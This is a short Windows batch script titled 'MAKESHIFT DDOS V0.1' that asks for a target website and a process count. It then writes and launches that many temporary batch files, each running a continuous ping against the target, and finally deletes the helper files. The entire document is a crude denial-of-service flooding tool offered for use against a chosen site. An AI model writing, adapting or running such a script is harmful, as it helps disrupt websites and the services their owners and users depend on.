@echo off
title MAKESHIFT DDOS V0.1
color 4f
cd %temp%
set /a valf = 1
echo Enter ammount of processes.
set /p amount=
echo Enter the website.
set /p website=
:loop
if %valf% == %amount% goto sotp

:exec
set /a valf = %valf% + 1
echo mode con: cols=75 lines=5 > %valf%.bat
echo ping %website% -t >> %valf%.bat
start %valf%.bat
goto loop

:sotp
echo press any key to exit DDOS
pause >nul
:del
set /a valf2 = 1

:loop2
if %valf2% == %amount% goto exiz

:exec2
set /a valf2 = %valf2% + 1
del %valf2%.bat
goto loop2

:exiz
echo All instances deleted. Please right click the CMD icon and click close all windows.
pause
